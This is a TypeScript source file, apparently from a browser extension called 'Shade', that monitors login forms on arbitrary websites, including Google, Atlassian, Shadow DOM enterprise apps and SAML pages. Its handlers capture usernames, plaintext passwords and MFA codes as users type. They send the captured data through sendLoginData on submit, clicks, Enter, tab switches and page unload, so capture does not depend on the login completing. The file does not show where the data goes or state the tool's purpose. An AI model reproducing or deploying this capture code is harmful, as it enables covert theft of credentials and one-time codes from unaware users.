/**
 * Form handling utilities
 * Monitors forms and handles submissions
 */

import {
  handleSamlFormSubmit,
  isMFAField,
  isPasswordField,
  isUsernameField,
} from "../detectors";
import {
  addMFAField,
  addPasswordField,
  addUsernameField,
  detectedMFAType,
  formData,
  monitoredElements,
  passwordFields,
  pendingLoginData,
  resetFormState,
  setFormData,
  setLastSentLogin,
  setPendingLoginData,
  usernameFields,
} from "../state";
import {
  clearMultiStepLoginData,
  findAllButtons,
  findAllForms,
  findAllInputs,
  hasShadowDOMLoginForms,
  monitorLoginResult,
  restoreMultiStepUsername,
  saveMultiStepUsername,
  sendLoginData,
  sendLoginDataImmediate,
  trackInput,
} from "../utils";

/**
 * Event handler for password field changes
 */
const passwordChangeHandler = (e: Event): void => {
  setFormData("password", (e.target as HTMLInputElement).value);
};

/**
 * Event handler for password field input
 */
const passwordInputHandler = (e: Event): void => {
  setFormData("password", (e.target as HTMLInputElement).value);
};

/**
 * Check if a value looks like a valid email address
 */
const isValidEmail = (value: string): boolean => {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
};

/**
 * Event handler for username field changes
 * Protects already captured email from being overwritten
 */
const usernameChangeHandler = (e: Event): void => {
  const newValue = (e.target as HTMLInputElement).value;
  const existing = formData["username"];

  // If we already have a valid email captured, don't overwrite with a different value
  // This prevents GitHub from replacing user's email with username@github.com
  if (existing && isValidEmail(existing) && existing !== newValue) {
    console.log(
      "[Shade] Username already captured as email, skipping overwrite"
    );
    return;
  }

  setFormData("username", newValue);
};

/**
 * Event handler for username field input
 * Protects already captured email from being overwritten
 */
const usernameInputHandler = (e: Event): void => {
  const newValue = (e.target as HTMLInputElement).value;
  const existing = formData["username"];

  // If we already have a valid email captured, don't overwrite with a different value
  // This prevents GitHub from replacing user's email with username@github.com
  if (existing && isValidEmail(existing) && existing !== newValue) {
    console.log(
      "[Shade] Username already captured as email, skipping overwrite"
    );
    return;
  }

  setFormData("username", newValue);
};

/**
 * Event handler for button clicks (potential login triggers)
 * 수정: username만 있어도 로그인 데이터 전송 (비밀번호 캡처 불필요)
 */
const buttonClickHandler = (): void => {
  // If we already have username in formData, send it (password is optional)
  if (formData["username"]) {
    console.log("[Shade] Button click - sending login data with username only");
    sendLoginData();
    return;
  }

  // Try to get username directly from the fields
  if (usernameFields.length > 0) {
    for (const field of usernameFields) {
      if (field.value) {
        setFormData("username", field.value);
        console.log("[Shade] Button click - username from tracked field");
        sendLoginData();
        return;
      }
    }
  }

  // Also check password fields if present (but not required)
  if (passwordFields.length > 0) {
    for (const field of passwordFields) {
      if (field.value) {
        setFormData("password", field.value);
      }
    }
  }

  // Last resort: try to find any username fields on the page
  const allUsernameFields = Array.from(
    document.querySelectorAll("input")
  ).filter((input) => isUsernameField(input as HTMLInputElement));

  for (const field of allUsernameFields) {
    const inputField = field as HTMLInputElement;
    if (inputField.value) {
      setFormData("username", inputField.value);
      console.log("[Shade] Button click - username from page scan");
      sendLoginData();
      return;
    }
  }
};

/**
 * Handle form submission
 * 수정: username만 있어도 로그인 데이터 전송 (비밀번호 캡처 불필요)
 */
export const handleFormSubmit = (_event: Event): void => {
  // If we have username, send the data (password is optional)
  if (formData["username"]) {
    console.log(
      "[Shade] Form submit - sending login data with username:",
      formData["username"].substring(0, 3) + "***"
    );
    sendLoginData();
    return;
  }

  // Try to get username directly from the fields
  if (usernameFields.length > 0) {
    for (const field of usernameFields) {
      if (field.value) {
        setFormData("username", field.value);
        console.log("[Shade] Form submit - username from tracked field");
        sendLoginData();
        return;
      }
    }
  }

  // Also collect password if present (but not required)
  if (passwordFields.length > 0) {
    for (const field of passwordFields) {
      if (field.value) {
        setFormData("password", field.value);
      }
    }
  }

  // Last resort: find any username field on the page
  const allUsernameFields = Array.from(
    document.querySelectorAll("input")
  ).filter((input) => isUsernameField(input as HTMLInputElement));

  for (const field of allUsernameFields) {
    const inputField = field as HTMLInputElement;
    if (inputField.value) {
      setFormData("username", inputField.value);
      console.log("[Shade] Form submit - username from page scan");
      sendLoginData();
      return;
    }
  }
};

/**
 * Clear multi-step login data after successful login
 * Wrapper for the utility function
 */
const clearPendingUsername = (): void => {
  clearMultiStepLoginData();
};

/**
 * Monitor standalone input fields (outside forms)
 * This handles sites like Google that don't use <form> tags
 */
const monitorStandaloneInputs = (): void => {
  // Find all input fields on the page
  const allInputs = document.querySelectorAll("input");

  allInputs.forEach((input) => {
    // Skip if already monitored
    if (monitoredElements.has(input)) {
      return;
    }

    // Check if this input is inside a form (handled separately)
    if (input.closest("form")) {
      return;
    }

    const inputEl = input as HTMLInputElement;

    if (isPasswordField(inputEl)) {
      addPasswordField(inputEl);
      inputEl.addEventListener("change", passwordChangeHandler);
      inputEl.addEventListener("input", passwordInputHandler);
      monitoredElements.add(input);
      // Enable real-time tracking for autofill detection
      trackInput(inputEl);
      console.log("[Shade] Monitoring standalone password field");

      // Restore username from previous step if available
      const pendingUsername = restoreMultiStepUsername();
      if (pendingUsername && !formData["username"]) {
        setFormData("username", pendingUsername);
        console.log("[Shade] Restored username from multi-step login");
      }
    } else if (isUsernameField(inputEl)) {
      addUsernameField(inputEl);
      inputEl.addEventListener("change", usernameChangeHandler);
      inputEl.addEventListener("input", usernameInputHandler);
      monitoredElements.add(input);
      // Enable real-time tracking for autofill detection
      trackInput(inputEl);
      console.log("[Shade] Monitoring standalone username field");

      // Save username when user moves to next step (for multi-step logins)
      inputEl.addEventListener("blur", () => {
        if (inputEl.value) {
          saveMultiStepUsername(inputEl.value);
        }
      });

      // Also save on Enter key press (form submission)
      inputEl.addEventListener("keydown", (e) => {
        if (e.key === "Enter" && inputEl.value) {
          saveMultiStepUsername(inputEl.value);
        }
      });
    } else if (isMFAField(inputEl)) {
      addMFAField(inputEl);
      inputEl.addEventListener("change", () => {
        setFormData("mfa", inputEl.value);
      });
      inputEl.addEventListener("input", () => {
        setFormData("mfa", inputEl.value);
      });
      monitoredElements.add(input);
      console.log("[Shade] Monitoring standalone MFA field");
    }
  });
};

/**
 * Find custom login fields that don't use standard input elements
 * Handles sites like Atlassian that use custom UI components
 */
const monitorCustomLoginFields = (): void => {
  // Selectors for custom login components (Atlassian, etc.)
  const customSelectors = [
    // Atlassian-specific selectors
    '[data-testid*="username"]',
    '[data-testid*="password"]',
    '[data-testid*="email"]',
    '[data-testid*="login"]',
    // Generic data-test selectors
    '[data-test*="username"]',
    '[data-test*="password"]',
    '[data-test*="email"]',
    // ARIA label selectors
    '[aria-label*="email" i]',
    '[aria-label*="username" i]',
    '[aria-label*="password" i]',
    '[aria-label*="사용자" i]',
    '[aria-label*="비밀번호" i]',
    '[aria-label*="이메일" i]',
    // Role-based selectors
    '[role="textbox"][aria-label*="email" i]',
    '[role="textbox"][aria-label*="password" i]',
  ];

  const customElements = document.querySelectorAll(customSelectors.join(", "));

  customElements.forEach((element) => {
    if (monitoredElements.has(element)) {
      return;
    }

    // Check if it's an input element
    if (element instanceof HTMLInputElement) {
      if (isPasswordField(element)) {
        addPasswordField(element);
        element.addEventListener("change", passwordChangeHandler);
        element.addEventListener("input", passwordInputHandler);
        monitoredElements.add(element);
        console.log("[Shade] Monitoring custom password field:", element);
      } else if (isUsernameField(element)) {
        addUsernameField(element);
        element.addEventListener("change", usernameChangeHandler);
        element.addEventListener("input", usernameInputHandler);
        element.addEventListener("blur", () => {
          if (element.value) {
            saveMultiStepUsername(element.value);
          }
        });
        element.addEventListener("keydown", (e) => {
          if (e.key === "Enter" && element.value) {
            saveMultiStepUsername(element.value);
          }
        });
        monitoredElements.add(element);
        console.log("[Shade] Monitoring custom username field:", element);
      }
    } else {
      // For non-input elements (like contenteditable divs), try to find nested inputs
      const nestedInputs = element.querySelectorAll("input");
      nestedInputs.forEach((input) => {
        if (monitoredElements.has(input)) {
          return;
        }

        const inputEl = input as HTMLInputElement;
        if (isPasswordField(inputEl)) {
          addPasswordField(inputEl);
          inputEl.addEventListener("change", passwordChangeHandler);
          inputEl.addEventListener("input", passwordInputHandler);
          monitoredElements.add(input);
          console.log(
            "[Shade] Monitoring nested password field in custom component"
          );
        } else if (isUsernameField(inputEl)) {
          addUsernameField(inputEl);
          inputEl.addEventListener("change", usernameChangeHandler);
          inputEl.addEventListener("input", usernameInputHandler);
          monitoredElements.add(input);
          console.log(
            "[Shade] Monitoring nested username field in custom component"
          );
        }
      });
    }
  });

  if (customElements.length > 0) {
    console.log(
      "[Shade] Found custom login components:",
      customElements.length
    );
  }
};

/**
 * Monitor input fields inside Shadow DOM
 * Handles Salesforce, ServiceNow, and other enterprise SaaS
 */
const monitorShadowDOMInputs = (): void => {
  const allInputs = findAllInputs();

  allInputs.forEach((input) => {
    // Skip if already monitored
    if (monitoredElements.has(input)) {
      return;
    }

    // Skip inputs that are in the regular DOM (already handled)
    if (document.body.contains(input)) {
      return;
    }

    if (isPasswordField(input)) {
      addPasswordField(input);
      input.addEventListener("change", passwordChangeHandler);
      input.addEventListener("input", passwordInputHandler);
      monitoredElements.add(input);
      console.log("[Shade] Monitoring Shadow DOM password field");

      // Restore username from previous step if available
      const pendingUsername = restoreMultiStepUsername();
      if (pendingUsername && !formData["username"]) {
        setFormData("username", pendingUsername);
        console.log("[Shade] Restored username in Shadow DOM context");
      }
    } else if (isUsernameField(input)) {
      addUsernameField(input);
      input.addEventListener("change", usernameChangeHandler);
      input.addEventListener("input", usernameInputHandler);
      input.addEventListener("blur", () => {
        if (input.value) {
          saveMultiStepUsername(input.value);
        }
      });
      input.addEventListener("keydown", (e) => {
        if (e.key === "Enter" && input.value) {
          saveMultiStepUsername(input.value);
        }
      });
      monitoredElements.add(input);
      console.log("[Shade] Monitoring Shadow DOM username field");
    } else if (isMFAField(input)) {
      addMFAField(input);
      input.addEventListener("change", () => {
        setFormData("mfa", input.value);
      });
      input.addEventListener("input", () => {
        setFormData("mfa", input.value);
      });
      monitoredElements.add(input);
      console.log("[Shade] Monitoring Shadow DOM MFA field");
    }
  });

  // Also monitor buttons in Shadow DOM
  const allButtons = findAllButtons();
  allButtons.forEach((button) => {
    if (monitoredElements.has(button)) {
      return;
    }

    // Skip buttons in regular DOM
    if (document.body.contains(button)) {
      return;
    }

    button.addEventListener("click", buttonClickHandler);
    monitoredElements.add(button);
    console.log("[Shade] Monitoring Shadow DOM button");
  });
};

/**
 * Helper to send login data immediately (for page unload scenarios)
 * Uses sendLoginDataImmediate to bypass MFA wait time
 */
const sendImmediateLoginData = (): void => {
  const domain =
    window.location.protocol +
    "//" +
    window.location.hostname +
    ":" +
    (window.location.port ||
      (window.location.protocol === "https:" ? "443" : "80"));
  const username = formData["username"];
  const password = formData["password"] || "";

  if (username && username.length > 0) {
    sendLoginDataImmediate(domain, username, password, false);
  }
};

/**
 * Setup beforeunload handler to send data before page navigation
 * This catches SPAs and custom form submissions that don't trigger standard events
 */
let beforeUnloadSetup = false;
const setupBeforeUnloadHandler = (): void => {
  if (beforeUnloadSetup) return;
  beforeUnloadSetup = true;

  // Send data before page unloads (navigation, form redirect)
  // MUST use sendLoginDataImmediate to bypass MFA wait time - page will be gone before timeout fires
  window.addEventListener("beforeunload", () => {
    // If we have username data that hasn't been sent, send it now IMMEDIATELY
    if (formData["username"] && formData["username"].length > 0) {
      console.log(
        "[Shade] Page unloading - sending captured username data IMMEDIATELY"
      );
      sendImmediateLoginData();
    }
  });

  // Also handle visibilitychange (user switching tabs after form fill)
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "hidden" && formData["username"]) {
      console.log("[Shade] Page hidden - sending captured username data");
      sendLoginData();
    }
  });

  // Handle pagehide for bfcache scenarios
  // MUST use sendLoginDataImmediate - page will be gone before timeout fires
  window.addEventListener("pagehide", () => {
    if (formData["username"]) {
      console.log(
        "[Shade] Page hide - sending captured username data IMMEDIATELY"
      );
      sendImmediateLoginData();
    }
  });

  // Handle Enter key press globally (catches form submissions via keyboard)
  document.addEventListener(
    "keydown",
    (e) => {
      if (e.key === "Enter" && formData["username"]) {
        // Check if we're in an input field (likely form submission)
        const target = e.target as HTMLElement;
        if (target.tagName === "INPUT" || target.tagName === "TEXTAREA") {
          console.log(
            "[Shade] Enter key in input - sending captured username data"
          );
          // Small delay to allow form to process
          setTimeout(() => sendLoginData(), 100);
        }
      }
    },
    true
  ); // Use capture phase to get event first

  // Handle click events globally for any button-like elements
  document.addEventListener(
    "click",
    (e) => {
      const target = e.target as HTMLElement;

      // Find the actual button element (target might be a child element inside the button)
      const buttonElement =
        target.tagName === "BUTTON" ? target : target.closest("button");

      const isButtonLike =
        target.tagName === "BUTTON" ||
        (target.tagName === "INPUT" &&
          ((target as HTMLInputElement).type === "submit" ||
            (target as HTMLInputElement).type === "button")) ||
        buttonElement ||
        target.getAttribute("role") === "button";

      if (isButtonLike) {
        // Use button element's text if available, otherwise fall back to target's text
        const buttonText = (
          buttonElement?.textContent ||
          target.textContent ||
          ""
        ).toLowerCase();
        const isLoginButton = [
          "sign in",
          "log in",
          "login",
          "continue",
          "next",
          "submit",
          "로그인",
          "계속",
          "다음",
        ].some((text) => buttonText.includes(text));

        if (isLoginButton) {
          // If we already have a valid email captured, use it directly without re-scanning
          // This prevents GitHub from replacing user's email with username@github.com
          if (formData["username"] && isValidEmail(formData["username"])) {
            console.log(
              "[Shade] Login button clicked - using existing email:",
              formData["username"].substring(0, 3) + "***"
            );
            setTimeout(() => sendLoginData(), 100);
            return;
          }

          // If we don't have username yet, try to capture from any visible input fields
          if (!formData["username"]) {
            console.log(
              "[Shade] Login button clicked - scanning for username value"
            );
            const allInputs = document.querySelectorAll<HTMLInputElement>(
              'input[type="text"], input[type="email"], input:not([type])'
            );
            for (const input of Array.from(allInputs)) {
              if (input.value && input.offsetParent !== null) {
                // Check common username field indicators
                const name = (input.name || "").toLowerCase();
                const id = (input.id || "").toLowerCase();
                const placeholder = (input.placeholder || "").toLowerCase();
                const isLikelyUsername =
                  isUsernameField(input) ||
                  name.includes("login") ||
                  name.includes("user") ||
                  name.includes("email") ||
                  id.includes("login") ||
                  id.includes("user") ||
                  id.includes("email") ||
                  placeholder.includes("email") ||
                  placeholder.includes("user") ||
                  input.type === "email";

                if (isLikelyUsername) {
                  setFormData("username", input.value);
                  console.log(
                    "[Shade] Captured username from page scan:",
                    input.value.substring(0, 3) + "***"
                  );
                  break;
                }
              }
            }
          }

          if (formData["username"]) {
            console.log(
              "[Shade] Login button clicked - sending captured username data"
            );
            setTimeout(() => sendLoginData(), 100);
          }
        }
      }
    },
    true
  );

  console.log("[Shade] Navigation handlers setup complete");
};

/**
 * Find all forms on the page and attach event listeners
 * Enhanced with Shadow DOM support
 */
export const findAndMonitorForms = (): void => {
  // Setup navigation handlers to catch form data before page change
  setupBeforeUnloadHandler();

  // Reset stored data
  resetFormState();

  // Find all forms (including Shadow DOM)
  const regularForms = document.querySelectorAll("form");
  const shadowForms = findAllForms();
  const forms = [
    ...Array.from(regularForms),
    ...shadowForms.filter(
      (f) => !regularForms.length || !Array.from(regularForms).includes(f)
    ),
  ];
  console.log(
    "[Shade] Found forms:",
    forms.length,
    "(Shadow DOM:",
    shadowForms.length - regularForms.length,
    ")"
  );

  // Check for password fields (including Shadow DOM)
  const allPasswordFields = document.querySelectorAll('input[type="password"]');
  const shadowPasswordFields = hasShadowDOMLoginForms();
  console.log(
    "[Shade] Found password fields:",
    allPasswordFields.length,
    "(Shadow DOM:",
    shadowPasswordFields,
    ")"
  );

  // Monitor standalone inputs (outside forms) - handles Google, etc.
  monitorStandaloneInputs();

  // Monitor custom login fields (Atlassian, etc.)
  monitorCustomLoginFields();

  // Monitor Shadow DOM inputs if present
  if (shadowPasswordFields) {
    monitorShadowDOMInputs();
  }

  forms.forEach((form) => {
    // Skip if this form already has our event listener
    if (monitoredElements.has(form)) {
      return;
    }

    // Find input fields
    const inputs = form.querySelectorAll("input");

    // Identify username and password fields
    inputs.forEach((input) => {
      // Skip if this input already has our event listener
      if (monitoredElements.has(input)) {
        return;
      }

      if (isPasswordField(input as HTMLInputElement)) {
        addPasswordField(input as HTMLInputElement);

        // Monitor password field changes
        input.addEventListener("change", passwordChangeHandler);
        input.addEventListener("input", passwordInputHandler);
        monitoredElements.add(input);
        // Enable real-time tracking for autofill detection
        trackInput(input as HTMLInputElement);
      } else if (isUsernameField(input as HTMLInputElement)) {
        addUsernameField(input as HTMLInputElement);

        // Monitor username field changes
        input.addEventListener("change", usernameChangeHandler);
        input.addEventListener("input", usernameInputHandler);
        monitoredElements.add(input);
        // Enable real-time tracking for autofill detection
        trackInput(input as HTMLInputElement);
      } else if (isMFAField(input as HTMLInputElement)) {
        addMFAField(input as HTMLInputElement);

        // If we have pending login data and just detected MFA, monitor for success before sending
        if (pendingLoginData && pendingLoginData.timeoutId) {
          clearTimeout(pendingLoginData.timeoutId);
          monitorLoginResult(
            pendingLoginData.domain,
            pendingLoginData.username,
            pendingLoginData.password,
            true,
            detectedMFAType
          );
          setLastSentLogin({
            domain: pendingLoginData.domain,
            username: pendingLoginData.username,
            timestamp: pendingLoginData.timestamp,
          });
          setPendingLoginData(null);
        }

        // Monitor MFA field changes
        input.addEventListener("change", () => {
          setFormData("mfa", (input as HTMLInputElement).value);
        });
        input.addEventListener("input", () => {
          setFormData("mfa", (input as HTMLInputElement).value);
        });
        monitoredElements.add(input);
      }
    });

    // Monitor form submission (including SAML POSTs)
    const hasSaml = !!form.querySelector(
      'input[name="SAMLResponse"], input[id*="SAMLResponse"]'
    );
    if (hasSaml) {
      form.addEventListener("submit", () => {
        handleSamlFormSubmit(form as HTMLFormElement, handleFormSubmit);
      });
    } else {
      form.addEventListener("submit", handleFormSubmit);
    }
    monitoredElements.add(form);
  });

  // Also monitor for button clicks that might trigger login
  const buttons = document.querySelectorAll(
    'button, input[type="submit"], input[type="button"]'
  );

  buttons.forEach((button) => {
    // Skip if this button already has our event listener
    if (monitoredElements.has(button)) {
      return;
    }

    button.addEventListener("click", buttonClickHandler);
    monitoredElements.add(button);
  });
};
